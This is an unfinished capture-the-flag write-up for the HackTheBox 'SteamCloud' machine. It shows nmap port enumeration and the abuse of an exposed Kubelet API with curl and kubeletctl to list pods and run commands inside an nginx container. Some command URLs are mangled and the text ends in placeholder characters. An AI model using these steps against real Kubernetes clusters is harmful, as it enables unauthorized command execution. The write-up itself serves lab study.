# nmap
##  nmap all ports
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/SteamCloud/screenshots/nmap-all-ports.png)
Theres a bunch of Kubernets related services and ports:
2379: etcd-client
2380: etcd-server
10250: https-alt: Kubelet --> Kubernetes extension
8443: Kubernetes API 
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/SteamCloud/screenshots/Kubernetes%20assigned%20prts.png)

##  Kubernetes API port: 8443
````
curl https:##  steamcloud.htb:8443 -k

`````
Access is denied
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/SteamCloud/screenshots/Kubernetes%20API%20enum.png)

##  receive pods (containers) file from Kubelet API on port 10250
````

curl https:##  steamcloud.htb:10250/pods -k

````

One receives all the pods from K8s cluster
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/SteamCloud/screenshots/Kubelet%20pods%20file%20snippet.png)

# kubeletctl
To interact with the pods use kubeletctl client

##  List pods on server
````
./kubeletctl --server steamcloud.htb pods

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/SteamCloud/screenshots/Kubelet%20pods%20on%20server.png)

##  Scan if any nodes allow to execute commands
````
./kubeletctl --server steamcloud.htb scan rce

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/SteamCloud/screenshots/Kubelet%20scan%20pods%20for%20remote%20commands.png)

Execute command: id on nginx server
````

kubeletctl --server steamclout.htb exec "id" --pod nginx --container nginx
````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/SteamCloud/screenshots/Kubelet%20execute%20remote%20command.png)

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/SteamCloud/screenshots/Kubelet%20retrieve%20certificate.png)











XXXXXXXXXXXXX